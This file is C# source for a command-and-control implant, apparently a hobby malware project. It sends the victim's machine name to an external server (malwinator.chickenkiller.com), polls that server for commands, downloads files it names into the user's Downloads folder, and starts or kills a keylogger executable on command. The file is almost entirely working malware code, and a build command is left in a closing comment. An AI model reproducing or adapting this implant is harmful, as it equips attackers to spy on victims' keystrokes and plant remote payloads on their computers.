using System.Diagnostics;

namespace C2
{
    class Program
    {
        private static string requestResult = string.Empty;
        private static Uri url = new Uri("https://malwinator.chickenkiller.com");
        private static string machineName = Environment.MachineName;
        private static string username = Environment.UserName;
        private static string filePath = "C:\\Users\\" + username + "\\Downloads\\";
        private static Process process = new Process();
        private static string processName = string.Empty;

        // adding the post data to the request (name=machineName)
        private static KeyValuePair<string, string> machineNameFormData = new KeyValuePair<string, string>("name", machineName);

        private static HttpClient server = new HttpClient();

        static void Main(string[] argv)
        {
            server.Timeout = TimeSpan.FromDays(1);

            while (true)
            {
                // each 15 seconds the program will try to connect to the remote server
                bool connectionSuccess = false;
                while (!connectionSuccess)
                {
                    Thread.Sleep(1000 * 5);
                    try
                    {
                        requestResult = server.PostAsync(url + "/handshake", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { machineNameFormData })).Result.Content.ReadAsStringAsync().Result;
                        Console.WriteLine(requestResult);
                        connectionSuccess = true;
                    }
                    catch
                    {
                        Console.WriteLine("[X] Connection Refused!");
                    }

                }

                // make the connection, if the connection fails it gets back to trying the connection
                bool readySuccess = true;
                while (readySuccess)
                {
                    try
                    {
                        requestResult = server.PostAsync(url + "/ready", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { machineNameFormData })).Result.Content.ReadAsStringAsync().Result;
                        ManageCommand(requestResult);
                        readySuccess = true;
                    }
                    catch
                    {
                        Console.WriteLine("[!] Connection Ended!");
                        readySuccess = false;
                    }
                }
            }
        }

        static async void ManageCommand(string command)
        {
            string[] args = command.Split(' ');


            switch (args[0])
            {
                case "ping":
                    requestResult = server.PostAsync(url + "/pong", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { machineNameFormData })).Result.Content.ReadAsStringAsync().Result;
                    Console.WriteLine(requestResult);
                    break;

                case "download":
                    KeyValuePair<string, string> fileFormData = new KeyValuePair<string, string>("file", args[1]);

                    HttpResponseMessage response = server.PostAsync(url + "/download", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { fileFormData })).Result;

                    // Check if the request was successful
                    if (response.IsSuccessStatusCode)
                    {
                        // Save the file content to a local file
                        using (FileStream fileStream = new FileStream(filePath + args[1], FileMode.Create))
                        {
                            await response.Content.CopyToAsync(fileStream);
                        }

                        Console.WriteLine($"[+] File downloaded successfully: {filePath}");
                    }
                    else
                    {
                        // Display the status code and reason phrase
                        Console.WriteLine($"[X] Failed to download file: {response.StatusCode} {response.ReasonPhrase}");
                    }
                    break;

                case "log":
                    if (!processName.Equals(string.Empty))
                    {
                        Console.WriteLine("[!] Process already started!");
                        return;
                    }
                    process.StartInfo.FileName = "C:\\Users\\" + username + "\\Downloads\\MyConsoleApp.exe"; // Path to the keylogger executable file
                    process.StartInfo.Arguments = ""; // Command-line arguments

                    // Start the process
                    process.Start();
                    Console.WriteLine($"[+] Process started! PID: {process.Id}");
                    processName = "keylogger";
                    break;


                case "end-log":
                    if (processName == "keylogger")
                    {
                        process.Kill();
                        Console.WriteLine($"[+] Process {process.Id} killed!");
                        processName = string.Empty;
                    }
                    break;


                default:
                    Console.WriteLine("[!] Command not recognized! (" + command + ")");
                    break;
            }
        }
    }
}

// useful commands
// dotnet publish -c Release
// executable path: bin\Release\net8.0\win-x64\publish\
